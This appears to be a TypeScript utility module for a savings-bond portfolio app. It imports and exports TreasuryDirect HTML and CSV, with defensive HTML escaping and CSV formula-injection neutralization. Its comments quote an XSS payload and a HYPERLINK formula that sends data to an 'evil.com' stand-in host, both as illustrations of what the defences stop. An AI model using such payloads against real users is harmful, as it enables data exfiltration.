import { Bond } from '../types';

/**
 * Escape user-controlled strings for safe interpolation into HTML text
 * content OR attribute values. Covers the five characters that can
 * break out of either context (`&`, `<`, `>`, `"`, `'`).
 *
 * Always wrap ANY bond field (especially `note`, which the user types
 * directly) in this before templating it into HTML — see
 * `generateTreasuryHTML`. Without it, a note of
 * `<script>alert(1)</script>` will execute when the exported inventory
 * file is opened in any browser.
 */
// Exported so vitest unit tests can target the security helpers
// directly. Production callers should use the public API
// (`generateTreasuryHTML`, `generateCSV`, `parseBondsFromHTML`),
// which already wraps these helpers at every sink.
export function escapeHTML(s: string | number): string {
  return String(s)
    .replace(/&/g, '&amp;') // & first — otherwise we'd double-escape later steps
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Inverse of `escapeHTML` for the hidden-input fallback parser.
 * TreasuryDirect's saveable HTML stores display strings already
 * entity-encoded, so we decode them back to their raw text. Combined
 * with `escapeHTML` on export, this gives us a clean round-trip without
 * silently turning legitimate `<` / `>` / `&` characters in serials
 * and notes into `&lt;` / `&gt;` / `&amp;`.
 *
 * Note: the `&amp;` replacement runs LAST so we don't double-decode.
 */
export function unescapeHTML(s: string): string {
  return s
    .replace(/&#39;/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/&gt;/g, '>')
    .replace(/&lt;/g, '<')
    .replace(/&amp;/g, '&'); // & last
}

/**
 * Prefix CSV cell values that start with a formula trigger (one of
 * `=`, `+`, `-`, `@`, TAB, CR) with a single quote so spreadsheet apps
 * (Excel, LibreOffice, Numbers) interpret the cell as literal text
 * rather than executing the payload.
 *
 * Standard OWASP defense against CSV-injection / formula-injection.
 * Protects users who export their portfolio then open the CSV in a
 * spreadsheet that auto-executes formulas — without this, a note of
 * `=HYPERLINK("https://evil.com/?exfil", "Open me")` becomes a
 * clickable exfiltration link the moment the file is opened.
 */
export function neutralizeCSVFormula(s: string): string {
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

/**
 * Reference date used by every "as of today" computation in the app
 * (the dashboard's maturity comparisons in App.tsx, and `isBondMatured`'s
 * default reference when called without explicit args).
 *
 * Centralized in one place so a future bump can flip the whole dashboard
 * at once, and so tests can pin a deterministic reference without
 * freezing "now" globally (`new Date()` would be TZ-sensitive and shift
 * across month rollover). `{ year, month }` is also the shape
 * `isBondMatured(b.finalMaturity, year, month)` expects.
 */
export const CURRENT_REFERENCE_DATE = { year: 2026, month: 7 };

/**
 * Decodes the Treasury month value (e.g., 745) to "MM/YYYY" format.
 * Base: May 2003 = 745
 */
export function decodeTreasuryMonth(monthValue: number): string {
  if (isNaN(monthValue)) return "";
  const totalMonthIndex = monthValue + 23295;
  const year = Math.floor(totalMonthIndex / 12);
  const month = (totalMonthIndex % 12) + 1;
  const monthStr = month < 10 ? `0${month}` : `${month}`;
  return `${monthStr}/${year}`;
}

/**
 * Encodes a "MM/YYYY" date string to Treasury month value.
 */
export function encodeTreasuryMonth(dateStr: string): number {
  if (!dateStr) return 0;
  const parts = dateStr.split('/');
  if (parts.length !== 2) return 0;
  const month = parseInt(parts[0], 10);
  const year = parseInt(parts[1], 10);
  if (isNaN(month) || isNaN(year)) return 0;
  
  const totalMonthIndex = year * 12 + (month - 1);
  return totalMonthIndex - 23295;
}

// ---------- Value "as of" month helpers ----------
//
// Every value in a bond report is a snapshot as of the redemption date
// the user picked on the Treasury calculator (or the month of manual
// entry / last re-import). Tracking that month lets the dashboard flag
// portfolios that haven't been re-imported recently, instead of
// silently presenting stale totals as current.

// Zero-padded month names in Treasury column order (January first).
// Index 0 is unused padding so MONTH_NAMES[m] is the m-th month.
const MONTH_NAMES = [
  '', 'January', 'February', 'March', 'April', 'May', 'June',
  'July', 'August', 'September', 'October', 'November', 'December',
] as const;

/**
 * The month this device considers "now" as {year, month}. Derived from
 * the real clock by default; tests can pin a deterministic "now" by
 * passing explicit arguments.
 */
export function getCurrentReferenceMonth(
  now: Date = new Date(),
): { year: number; month: number } {
  return { year: now.getFullYear(), month: now.getMonth() + 1 };
}

/**
 * Parses "MM/YYYY" into an absolute month count (year*12 + month-1).
 * Returns null when the string is missing or malformed.
 */
export function parseMonthToMonths(monthStr: string | undefined): number | null {
  if (!monthStr) return null;
  const parts = monthStr.split('/');
  if (parts.length !== 2) return null;
  const month = parseInt(parts[0], 10);
  const year = parseInt(parts[1], 10);
  if (isNaN(month) || isNaN(year) || month < 1 || month > 12) return null;
  return year * 12 + (month - 1);
}

/**
 * Inverse of `parseMonthToMonths`: renders an absolute month count
 * back to zero-padded "MM/YYYY".
 */
export function formatMonthsAsMonth(totalMonths: number): string {
  const year = Math.floor(totalMonths / 12);
  const month = (totalMonths % 12) + 1;
  return `${month < 10 ? '0' : ''}${month}/${year}`;
}

/**
 * Whole months from `fromMonth` (e.g. a bond's valueAsOf) to the month
 * `to` (defaults to this device's current month). Negative when `to`
 * precedes `from` (e.g. a report computed for a future redemption
 * date). Unparseable inputs return null so callers can treat the
 * stamp as "unknown" instead of guessing an age.
 */
export function monthsBetween(
  fromMonth: string | undefined,
  to: { year: number; month: number } = getCurrentReferenceMonth(),
): number | null {
  const from = parseMonthToMonths(fromMonth);
  if (from === null) return null;
  const toMonths = to.year * 12 + (to.month - 1);
  return toMonths - from;
}

/**
 * True when a bond's value stamp is at least `threshold` whole months
 * older than the reference month (default: now). Unknown stamps
 * (pre-feature bonds) count as stale — the dashboard should nudge the
 * user to re-import rather than silently trust ancient numbers.
 */
export function isValueStale(
  valueAsOf: string | undefined,
  threshold: number,
  reference: { year: number; month: number } = getCurrentReferenceMonth(),
): boolean {
  const age = monthsBetween(valueAsOf, reference);
  if (age === null) return true;
  return age >= threshold;
}

/**
 * Aggregate freshness of a whole portfolio, computed from the freshest
 * value stamp present. `ageInMonths` measures that freshest stamp — an
 * old portfolio with one freshly re-imported bond is NOT flagged as a
 * whole (the warning would be meaningless: most rows are still old).
 * An empty inventory, or one with no stamps at all, is `fresh` (the
 * empty-state UI already guides first-run setup).
 */
export interface PortfolioStaleness {
  isStale: boolean;
  ageInMonths: number | null;
  asOfMonth: string | null; // MM/YYYY of the freshest stamp
  freshCount: number; // bonds carrying a parseable stamp
}

export function computePortfolioStaleness(
  bonds: Bond[],
  threshold: number,
  reference: { year: number; month: number } = getCurrentReferenceMonth(),
): PortfolioStaleness {
  const referenceMonths = reference.year * 12 + (reference.month - 1);
  let freshest: number | null = null;
  let freshCount = 0;

  for (const b of bonds) {
    const months = parseMonthToMonths(b.valueAsOf);
    if (months === null) continue;
    freshCount++;
    if (freshest === null || months > freshest) freshest = months;
  }

  if (freshest === null) {
    return { isStale: false, ageInMonths: null, asOfMonth: null, freshCount: 0 };
  }

  const ageInMonths = referenceMonths - freshest;
  return {
    isStale: ageInMonths >= threshold,
    ageInMonths,
    asOfMonth: formatMonthsAsMonth(freshest),
    freshCount,
  };
}

/**
 * Human-readable as-of label, e.g. "as of July 2026". Unknown stamps
 * fall back to "value date unknown" so the tooltip is never blank.
 */
export function formatAsOfLabel(valueAsOf: string | undefined): string {
  const months = parseMonthToMonths(valueAsOf);
  if (months === null) return 'value date unknown';
  const year = Math.floor(months / 12);
  const month = (months % 12) + 1;
  return `as of ${MONTH_NAMES[month]} ${year}`;
}

/**
 * Parses an HTML file content string and returns list of Bonds.
 * Supports both Table Row parsing and Hidden Input parsing.
 */
export function parseBondsFromHTML(htmlText: string): Bond[] {
  const bonds: Bond[] = [];
  
  try {
    // 1. Try parsing via DOMParser (for tables)
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlText, 'text/html');
    const rows = doc.querySelectorAll('table tr');
    
    if (rows && rows.length > 0) {
      rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        // A valid bond row has exactly 11 columns
        if (cells.length === 11 && !row.id.includes('ttl') && !row.querySelector('th')) {
          const serial = cells[0].textContent?.trim() || "";
          const series = cells[1].textContent?.trim() as 'I' | 'EE';
          const denomText = cells[2].textContent?.trim() || "";
          const issueDate = cells[3].textContent?.trim() || "";
          const nextAccrual = cells[4].textContent?.trim() || "";
          const finalMaturity = cells[5].textContent?.trim() || "";
          const issuePriceText = cells[6].textContent?.trim() || "";
          const interestText = cells[7].textContent?.trim() || "";
          const rateText = cells[8].textContent?.trim() || "";
          const valueText = cells[9].textContent?.trim() || "";
          const note = cells[10].textContent?.trim() || "";
          
          if (serial && (series === 'I' || series === 'EE')) {
            const denomination = parseFloat(denomText.replace(/[^0-9.]/g, '')) || 0;
            const issuePrice = parseFloat(issuePriceText.replace(/[^0-9.]/g, '')) || 0;
            const interest = parseFloat(interestText.replace(/[^0-9.]/g, '')) || 0;
            const interestRate = parseFloat(rateText.replace(/[^0-9.]/g, '')) || 0;
            const value = parseFloat(valueText.replace(/[^0-9.]/g, '')) || 0;
            
            bonds.push({
              serial,
              series,
              denomination,
              issueDate,
              nextAccrual,
              finalMaturity,
              issuePrice,
              interest,
              interestRate,
              value,
              note: note === '\xa0' || note === '&nbsp;' ? "" : note
            });
          }
        }
      });
    }
    
    if (bonds.length > 0) {
      return bonds;
    }
  } catch (err) {
    console.warn("DOM parsing failed, falling back to hidden inputs parser", err);
  }
  
  // 2. Fallback: Parse from Hidden Variables using regex (very robust)
  try {
    const serialListRaw = extractHiddenValue(htmlText, 'SerialNumList');
    const seriesListRaw = extractHiddenValue(htmlText, 'SeriesList');
    const denominationListRaw = extractHiddenValue(htmlText, 'DenominationList');
    const issuePriceListRaw = extractHiddenValue(htmlText, 'IssuePriceList');
    const interestListRaw = extractHiddenValue(htmlText, 'InterestList');
    const valueListRaw = extractHiddenValue(htmlText, 'ValueList');
    const interestRateListRaw = extractHiddenValue(htmlText, 'InterestRateList');
    const issueDateListRaw = extractHiddenValue(htmlText, 'IssueDateList');
    const nextAccrualDateListRaw = extractHiddenValue(htmlText, 'NextAccrualDateList');
    const maturityDateListRaw = extractHiddenValue(htmlText, 'MaturityDateList');
    const noteListRaw = extractHiddenValue(htmlText, 'NoteList');
    
    if (serialListRaw) {
      const serials = serialListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const series = seriesListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const denoms = denominationListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const issuePrices = issuePriceListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const interests = interestListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const values = valueListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const rates = interestRateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const issueDates = issueDateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const nextAccruals = nextAccrualDateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const maturities = maturityDateListRaw.split(';').map(s => s.trim()).filter(Boolean);
      const notes = noteListRaw.split(';').map(s => s.trim()); // preserve spacing or empty notes
      
      const count = serials.length;
      for (let i = 0; i < count; i++) {
        const serial = serials[i];
        const ser = (series[i] || 'I') as 'I' | 'EE';
        const denom = parseFloat(denoms[i]) || 0;
        const price = parseFloat(issuePrices[i]) || 0;
        const intr = parseFloat(interests[i]) || 0;
        const val = parseFloat(values[i]) || 0;
        const rate = parseFloat(rates[i]) || 0;
        
        // Dates need to be decoded
        const issueDate = decodeTreasuryMonth(parseInt(issueDates[i], 10));
        const nextAccrual = decodeTreasuryMonth(parseInt(nextAccruals[i], 10));
        const finalMaturity = decodeTreasuryMonth(parseInt(maturities[i], 10));
        const rawNote = notes[i] === " " ? "" : (notes[i] || "");

        // Round-trip with escapeHTML on export: hidden-input payload is
        // entity-encoded, so decode on import to recover the original
        // raw text the user typed (otherwise a serial like `C827&EE`
        // comes back as `C827&amp;EE` in the UI).
        bonds.push({
          serial: unescapeHTML(serial),
          series: unescapeHTML(ser) as 'I' | 'EE',
          denomination: denom,
          issueDate: unescapeHTML(issueDate),
          nextAccrual: unescapeHTML(nextAccrual),
          finalMaturity: unescapeHTML(finalMaturity),
          issuePrice: price,
          interest: intr,
          interestRate: rate,
          value: val,
          note: unescapeHTML(rawNote),
        });
      }
    }
  } catch (err) {
    console.error("Hidden inputs parsing failed too", err);
  }
  
  return bonds;
}

function extractHiddenValue(html: string, name: string): string {
  const regex = new RegExp(`name="${name}"\\s+value="([^"]*)"`, 'i');
  const match = html.match(regex);
  return match ? match[1] : "";
}

/**
 * Generates an HTML output matching the US Treasury's saveable format.
 */
export function generateTreasuryHTML(bonds: Bond[]): string {
  // To match Treasury Direct perfectly, we can convert dates to their encoded numbers
  // Note: the original HTML displays the table row in standard order (or reverse, we can preserve standard).
  //
  // SECURITY: every user-controlled string (serial, series, note, dates)
  // is passed through `escapeHTML` before being joined into semicolon-
  // delimited lists or table cell bodies. Without this, a note of
  // `<script>...</script>` or `"; onclick=...` would either execute
  // when the file is opened in a browser or break out of the hidden
  // input's value="..." attribute.
  const serials = bonds.map(b => escapeHTML(b.serial)).join(';') + ';';
  const issueDates = bonds.map(b => encodeTreasuryMonth(b.issueDate)).join(';') + ';';
  const series = bonds.map(b => escapeHTML(b.series)).join(';') + ';';
  const denoms = bonds.map(b => b.denomination).join(';') + ';';
  const issuePrices = bonds.map(b => b.issuePrice.toFixed(2)).join(';') + ';';
  const interests = bonds.map(b => b.interest.toFixed(2)).join(';') + ';';
  const ytdInterests = bonds.map(() => '0.00').join(';') + ';'; // Placeholder YTD
  const values = bonds.map(b => b.value.toFixed(2)).join(';') + ';';
  const rates = bonds.map(b => b.interestRate.toFixed(2)).join(';') + ';';
  const nextAccruals = bonds.map(b => encodeTreasuryMonth(b.nextAccrual)).join(';') + ';';
  const maturities = bonds.map(b => encodeTreasuryMonth(b.finalMaturity)).join(';') + ';';
  const notes = bonds.map(b => b.note ? escapeHTML(b.note) : ' ').join(';') + ';';

  const totalPrice = bonds.reduce((sum, b) => sum + b.issuePrice, 0);
  const totalValue = bonds.reduce((sum, b) => sum + b.value, 0);
  const totalInterest = bonds.reduce((sum, b) => sum + b.interest, 0);

  // Carry the portfolio's as-of month through the exported file so a
  // later re-import of THIS file can restamp without drifting. The
  // freshest stamp wins, matching how the dashboard judges freshness.
  // When NO bond carries a stamp the input is omitted entirely (never
  // a dummy month): parseReportAsOf returns null for such files, so
  // re-importing them stays "stamp unknown" instead of falsely
  // marking an ancient portfolio as freshly calculated.
  const freshestStampCode = bonds.reduce(
    (max, b) => Math.max(max, encodeTreasuryMonth(b.valueAsOf ?? '')),
    0,
  );
  const redemptionDateInput = freshestStampCode > 0
    ? `\n\t\t<input type="hidden" name="RedemptionDate" value="${freshestStampCode}">`
    : '';

  let rowsHtml = '';
  bonds.forEach(b => {
    rowsHtml += `<tr>
<td>${escapeHTML(b.serial)}</td>
<td class="c1">${escapeHTML(b.series)}</td>
<td>$${escapeHTML(b.denomination)}</td>
<td>${escapeHTML(b.issueDate)}</td>
<td>${escapeHTML(b.nextAccrual)}</td>
<td>${escapeHTML(b.finalMaturity)}</td>
<td>$${escapeHTML(b.issuePrice.toFixed(2))}</td>
<td>$${escapeHTML(b.interest.toFixed(2))}</td>
<td>${escapeHTML(b.interestRate.toFixed(2))}%</td>
<td class="ttl">$${escapeHTML(b.value.toFixed(2))}</td>
<td class="c1">${b.note ? escapeHTML(b.note) : '&nbsp;'}</td>
</tr>\n`;
  });

  return `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>Calculated Value of Your Paper Savings Bond(s)</title>
	<style>
		body { font-family: sans-serif; margin: 20px; }
		table { border-collapse: collapse; width: 100%; margin-top: 20px; }
		th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
		th { background-color: #f2f2f2; }
		.ttl { font-weight: bold; }
		.c1 { text-align: center; }
	</style>
</head>
<body>
	<h1>Calculated Value of Your Paper Savings Bond(s)</h1>
	<form method="post" action="https://treasurydirect.gov/BC/SBCPrice">
		<!-- Hidden Variables -->
		<input type="hidden" name="SerialNumList" value="${serials}">
		<input type="hidden" name="IssueDateList" value="${issueDates}">
		<input type="hidden" name="SeriesList" value="${series}">
		<input type="hidden" name="DenominationList" value="${denoms}">
		<input type="hidden" name="IssuePriceList" value="${issuePrices}">
		<input type="hidden" name="InterestList" value="${interests}">
		<input type="hidden" name="YTDInterestList" value="${ytdInterests}">
		<input type="hidden" name="ValueList" value="${values}">
		<input type="hidden" name="InterestRateList" value="${rates}">
		<input type="hidden" name="NextAccrualDateList" value="${nextAccruals}">
		<input type="hidden" name="MaturityDateList" value="${maturities}">
		<input type="hidden" name="NoteList" value="${notes}">
		<input type="hidden" name="OldRedemptionDate" value="1023">
		<input type="hidden" name="ViewPos" value="${bonds.length}">
		<input type="hidden" name="ViewType" value="All">
		<input type="hidden" name="Version" value="6">${redemptionDateInput}
		
		<h2>Calculator Results for Redemption Date</h2>
		<table id="tot">
			<tbody>
				<tr>
					<th>Total Price</th>
					<th>Total Value</th>
					<th>Total Interest</th>
				</tr>
				<tr>
					<td>$${totalPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td>$${totalValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td>$${totalInterest.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
				</tr>
			</tbody>
		</table>

		<br>
		<h2>Bonds: 1-${bonds.length} of ${bonds.length}</h2>
		<table>
			<thead>
				<tr>
					<th>Serial #</th>
					<th>Series</th>
					<th>Denom</th>
					<th>Issue Date</th>
					<th>Next Accrual</th>
					<th>Final Maturity</th>
					<th>Issue Price</th>
					<th>Interest</th>
					<th>Interest Rate</th>
					<th>Value</th>
					<th>Note</th>
				</tr>
			</thead>
			<tbody>
				${rowsHtml}
				<tr id="ttls">
					<td colspan="6">Totals for ${bonds.length} Bonds</td>
					<td>$${totalPrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td>$${totalInterest.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td></td>
					<td>$${totalValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
					<td></td>
				</tr>
			</tbody>
		</table>
	</form>
</body>
</html>`;
}

/**
 * Parses a single CSV line into cells per RFC 4180.
 *
 * Handles the two corner cases that tripped up the original toggle-
 * based parser:
 *   - `""` inside a quoted field is a single literal `"` (escape).
 *   - A bare `"` at the end of a quoted field closes the field.
 *
 * Note: cell content is NOT trimmed — RFC 4180 permits whitespace
 * inside a cell (e.g. `" 100 "`, `" abc "`), and we preserve it. The
 * old toggle-based parser stripped per-cell whitespace; this is a
 * deliberate, more-conformant departure. Line-leading/trailing
 * whitespace is still stripped upstream by `parseBondsFromCSV`'s
 * `line.trim()`.
 *
 * Does NOT support multi-line quoted fields: this function processes
 * a single line at a time. RFC 4180 allows newlines inside quoted
 * fields, but our `generateCSV` never produces them (notes are
 * single-line), and the line-split happens upstream in
 * `parseBondsFromCSV`. Supporting multi-line quoted fields would
 * require field-aware line splitting — a separate concern.
 */
export function parseCSVLine(line: string): string[] {
  const cols: string[] = [];
  let currentCell = '';
  let inQuote = false;
  let i = 0;

  while (i < line.length) {
    const char = line[i];

    if (inQuote) {
      if (char === '"') {
        // Inside a quoted field, look ahead: `""` is an escaped
        // quote, bare `"` closes the field.
        if (i + 1 < line.length && line[i + 1] === '"') {
          currentCell += '"';
          i += 2;
        } else {
          inQuote = false;
          i++;
        }
      } else {
        currentCell += char;
        i++;
      }
    } else {
      if (char === ',') {
        cols.push(currentCell);
        currentCell = '';
        i++;
      } else if (char === '"' && currentCell === '') {
        // Quote must open at the very start of a cell (RFC 4180).
        inQuote = true;
        i++;
      } else {
        currentCell += char;
        i++;
      }
    }
  }
  cols.push(currentCell);
  return cols;
}

/**
 * Parses CSV text into a Bond list.
 */
export function parseBondsFromCSV(csvText: string): Bond[] {
  const bonds: Bond[] = [];
  const lines = csvText.split(/\r?\n/);
  
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) continue;
    
    // Per-line RFC-4180 cell parser (handles `""` quote-escape correctly).
    const cols = parseCSVLine(line);
    
    // Skip header line if it contains 'serial' or 'series'
    if (i === 0 && (cols[0].toLowerCase().includes('serial') || cols[1].toLowerCase().includes('series'))) {
      continue;
    }
    
    // Expected structure:
    // Serial, Series, Denomination, Issue Date, Next Accrual, Final Maturity, Issue Price, Interest, Interest Rate, Value, Note[, Value As Of]
    if (cols.length >= 2) {
      const serial = cols[0] || '';
      const seriesRaw = (cols[1] || '').toUpperCase();
      const series = (seriesRaw === 'EE' || seriesRaw === 'I') ? seriesRaw : 'I';
      
      const denomination = parseFloat((cols[2] || '0').replace(/[^0-9.]/g, '')) || 0;
      const issueDate = cols[3] || '';
      const nextAccrual = cols[4] || '';
      const finalMaturity = cols[5] || '';
      const issuePrice = parseFloat((cols[6] || '0').replace(/[^0-9.]/g, '')) || 0;
      const interest = parseFloat((cols[7] || '0').replace(/[^0-9.]/g, '')) || 0;
      const interestRate = parseFloat((cols[8] || '0').replace(/[^0-9.]/g, '')) || 0;
      const value = parseFloat((cols[9] || '0').replace(/[^0-9.]/g, '')) || 0;
      const note = cols[10] || '';
      // Optional 12th column (added with as-of tracking). Older
      // portfolio CSVs have 11 columns; the parser accepts both.
      const valueAsOf = (cols[11] || '').trim() || undefined;
      
      if (serial) {
        bonds.push({
          serial,
          series,
          denomination,
          issueDate,
          nextAccrual,
          finalMaturity,
          issuePrice,
          interest,
          interestRate,
          value,
          note,
          valueAsOf,
        });
      }
    }
  }
  
  return bonds;
}

// ---------- Re-import merging ----------

/**
 * Result of folding a freshly imported bond report into the local
 * inventory. `merged` is the complete new list (refreshed existing
 * bonds in their original order, new bonds appended at the end);
 * the counts partition the imported rows:
 *
 *   addedCount    — serials not previously in the inventory (appended)
 *   updatedCount  — serials matched an existing bond AND the fresh
 *                   report's values differed (Interest / Rate / Value /
 *                   accrual & maturity dates refreshed)
 *   skippedCount  — serials matched but nothing changed (values were
 *                   already current)
 *
 * `missingFromReport` lists the OTHER direction: serials the local
 * inventory holds that the fresh report does not mention (redeemed
 * bonds, or a partial report). The merge itself keeps them in the
 * inventory; callers use this list to refresh local-only state such
 * as cash-out selections.
 */
export interface MergeImportResult {
  merged: Bond[];
  addedCount: number;
  updatedCount: number;
  skippedCount: number;
  missingFromReport: string[];
}

// Parsers emit 2-decimal currency/rate values, but float rounding can
// drift in the last bits (e.g. `75.00` parsed from CSV vs `75` stored
// from an earlier HTML import). Half-a-cent tolerance keeps such
// formatting noise from counting as a spurious "update".
const SAME_VALUE_EPSILON = 0.005;

function sameNumber(a: number, b: number): boolean {
  return Math.abs(a - b) < SAME_VALUE_EPSILON;
}

/**
 * Extracts the redemption month a Treasury report was calculated for,
 * as "MM/YYYY", from the hidden `RedemptionDate` input (Treasury's
 * encoded month value — same scheme as `decodeTreasuryMonth`). Files
 * without that input — plain CSVs, HTML exports from before as-of
 * tracking, legacy app saves — yield null, meaning "stamp unknown".
 */
export function parseReportAsOf(htmlText: string): string | null {
  const raw = extractHiddenValue(htmlText, 'RedemptionDate');
  if (!raw) return null;
  const code = parseInt(raw, 10);
  if (isNaN(code)) return null;
  return decodeTreasuryMonth(code) || null;
}

/**
 * True when the report-derived fields of `fresh` differ from the local
 * copy — i.e. the local bond should be refreshed. Deliberately does NOT
 * compare `note` or `isCashedOut`: those are local-only fields the
 * Treasury report can't know about, and the freshly imported note is
 * usually empty, so comparing them would wrongly flag every re-import
 * as an update and clobber user notes.
 */
function reportValuesDiffer(local: Bond, fresh: Bond): boolean {
  if (!sameNumber(local.denomination, fresh.denomination)) return true;
  if (!sameNumber(local.issuePrice, fresh.issuePrice)) return true;
  if (!sameNumber(local.interest, fresh.interest)) return true;
  if (!sameNumber(local.interestRate, fresh.interestRate)) return true;
  if (!sameNumber(local.value, fresh.value)) return true;
  if (local.issueDate.trim() !== fresh.issueDate.trim()) return true;
  if (local.nextAccrual.trim() !== fresh.nextAccrual.trim()) return true;
  if (local.finalMaturity.trim() !== fresh.finalMaturity.trim()) return true;
  return false;
}

/**
 * Merges a freshly imported bond list into the existing inventory,
 * matched by serial number.
 *
 *  - New serials are appended (in import order, after the existing
 *    bonds — the inventory's own order is never disturbed).
 *  - Known serials are refreshed with the report-derived fields from
 *    the import: `denomination`, `issueDate`, `nextAccrual`,
 *    `finalMaturity`, `issuePrice`, `interest`, `interestRate`, and
 *    `value`. This is what makes a monthly re-import keep the
 *    portfolio's totals accurate — bonds accrue interest monthly, so
 *    last month's Interest/Rate/Value are stale by definition.
 *  - Local-only fields survive every refresh: `note` and `isCashedOut`
 *    are kept from the existing bond (the Treasury file has no concept
 *    of either), and cash-out selections held elsewhere by serial stay
 *    valid because the serial set only ever grows.
 *  - Every merged bond is stamped with `valueAsOf` — the month the
 *    report's figures are "as of", so the dashboard can flag
 *    portfolios that haven't been re-imported recently. Pass the
 *    report's redemption month via `options.valueAsOf`. Unchanged
 *    ("skipped") bonds are ALSO restamped: a fresh report that agrees
 *    with stored values confirms them as of its month — otherwise a
 *    portfolio of frozen matured bonds would never refresh and would
 *    false-positive the staleness banner forever.
 *  - Identity fields (`serial`, `series`) are never overwritten — the
 *    serial is the match key and a bond's series doesn't change.
 *
 * Pure: neither `existing` nor `imported` (nor their Bond objects) are
 * mutated; `merged` is a new array whose refreshed entries are new
 * objects, so React state updates and diffing behave correctly.
 */
export function mergeImportedBonds(
  existing: Bond[],
  imported: Bond[],
  options: { valueAsOf?: string } = {},
): MergeImportResult {
  const merged: Bond[] = [...existing];

  // First occurrence wins if the inventory somehow contains a repeated
  // serial (legacy data) — later duplicates are left untouched.
  const indexBySerial = new Map<string, number>();
  merged.forEach((b, i) => {
    if (!indexBySerial.has(b.serial)) indexBySerial.set(b.serial, i);
  });

  let addedCount = 0;
  let updatedCount = 0;
  let skippedCount = 0;

  // Serials the fresh report actually covers — used at the end to
  // report which inventory bonds it no longer lists.
  const importedSerials = new Set<string>();

  for (const fresh of imported) {
    importedSerials.add(fresh.serial);

    const existingIndex = indexBySerial.get(fresh.serial);
    if (existingIndex === undefined) {
      indexBySerial.set(fresh.serial, merged.length);
      merged.push({ ...fresh, valueAsOf: options.valueAsOf ?? fresh.valueAsOf });
      addedCount++;
      continue;
    }

    const local = merged[existingIndex];
    if (!reportValuesDiffer(local, fresh)) {
      // Values already match — but a report month still CONFIRMS them
      // as current, so refresh the stamp (see docstring above).
      if (options.valueAsOf && options.valueAsOf !== local.valueAsOf) {
        merged[existingIndex] = { ...local, valueAsOf: options.valueAsOf };
      }
      skippedCount++;
      continue;
    }

    // Spread the local bond first so note / isCashedOut (and any
    // future local-only fields) carry over untouched, then override
    // with the report-derived values from the fresh file.
    merged[existingIndex] = {
      ...local,
      denomination: fresh.denomination,
      issueDate: fresh.issueDate,
      nextAccrual: fresh.nextAccrual,
      finalMaturity: fresh.finalMaturity,
      issuePrice: fresh.issuePrice,
      interest: fresh.interest,
      interestRate: fresh.interestRate,
      value: fresh.value,
      // Re-importing IS the freshness signal — even a bond whose
      // numbers didn't change is confirmed current by a fresh report.
      valueAsOf: options.valueAsOf ?? local.valueAsOf,
    };
    updatedCount++;
  }

  const missingFromReport = merged
    .filter(b => !importedSerials.has(b.serial))
    .map(b => b.serial);

  return { merged, addedCount, updatedCount, skippedCount, missingFromReport };
}

/**
 * Generates CSV string for the bond list.
 */
export function generateCSV(bonds: Bond[]): string {
  const headers = [
    'Serial #', 'Series', 'Denomination', 'Issue Date', 'Next Accrual',
    'Final Maturity', 'Issue Price', 'Interest', 'Interest Rate', 'Value', 'Note',
    'Value As Of',
  ];
  
  // SECURITY: every text cell passes through `neutralizeCSVFormula`
  // so spreadsheet apps don't auto-execute a payload that starts with
  // a formula trigger (=, +, -, @, TAB, CR). Numeric cells are safe
  // by construction — they can't start with a formula character.
  const rows = bonds.map(b => [
    `"${neutralizeCSVFormula(b.serial)}"`,
    `"${neutralizeCSVFormula(b.series)}"`,
    b.denomination,
    `"${neutralizeCSVFormula(b.issueDate)}"`,
    `"${neutralizeCSVFormula(b.nextAccrual)}"`,
    `"${neutralizeCSVFormula(b.finalMaturity)}"`,
    b.issuePrice,
    b.interest,
    b.interestRate,
    b.value,
    `"${neutralizeCSVFormula(b.note.replace(/"/g, '""'))}"`,
    `"${neutralizeCSVFormula(b.valueAsOf ?? '')}"`,
  ]);
  
  return [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
}

/**
 * Checks if a bond is matured (using Final Maturity MM/YYYY vs current/selected date).
 * Simple check: if Final Maturity is prior to or equal to current date.
 * We can parse MM/YYYY and compare to check.
 */
export function isBondMatured(
  maturityStr: string,
  // Default to the centralized reference date; App.tsx callers
  // currently pass `CURRENT_REFERENCE_DATE` explicitly to keep the
  // dashboard deterministic across sessions and timezones, but any
  // future caller that omits these will still get a sensible value.
  currentYear: number = CURRENT_REFERENCE_DATE.year,
  currentMonth: number = CURRENT_REFERENCE_DATE.month,
): boolean {
  if (!maturityStr) return false;
  const parts = maturityStr.split('/');
  if (parts.length !== 2) return false;
  const month = parseInt(parts[0], 10);
  const year = parseInt(parts[1], 10);
  if (isNaN(month) || isNaN(year)) return false;
  
  if (year < currentYear) return true;
  if (year === currentYear && month <= currentMonth) return true;
  return false;
}
